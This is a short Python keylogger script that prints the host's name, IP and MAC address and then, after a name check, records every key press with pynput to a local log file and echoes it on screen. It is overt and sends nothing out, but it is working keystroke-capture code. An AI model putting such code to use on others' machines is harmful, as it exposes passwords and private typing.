from pynput.keyboard import Key, Listener
import logging
from dataclasses import dataclass
from functools import partial,wraps
import argparse
import timeit
import socket
import getmac


@dataclass
class extra_information:
    hostname: object
    mac_address: object

    def get_ip(self):
        return socket.gethostbyname(self.hostname)

ei =  extra_information(socket.gethostname()
,getmac.get_mac_address())

print(f'This is hostname:{ei.hostname}')
print(f'Ip Address:{ei.get_ip()}')
print(f'This is mac address:{ei.mac_address}')

def intro():
    print("""
        Type this in the command line: python keylogger.py --name NAME
        NAME Should be eqaul to input name otherwise this won't Work
            so be careful with that
            """)

intro()


parser = argparse.ArgumentParser(description='Just type your name which should be equal to input name',epilog='Bye',usage='Hello [--name NAME]')
parser.add_argument('--name',help='Enter your name',type=str)

args = parser.parse_args()



name = input(f'Enter your name :')


if args.name == name:
    
    print('Start typing:')

    logging.basicConfig(format="%(asctime)s - %(message)s",filename='logged_infor.log',level=logging.DEBUG)

    logging.warning(timeit.timeit(stmt=f'b="Me"',setup='a=6'))

    

    def main():
        def second_main():
            def testing(key):   
                logging.debug(f'{name} pressed:{key}')
                print(f'{name} pressed:{key}') 
            
            
            with Listener(
                on_press=testing
                ) as listener:
                listener.join()
        second_main()
        
    main()






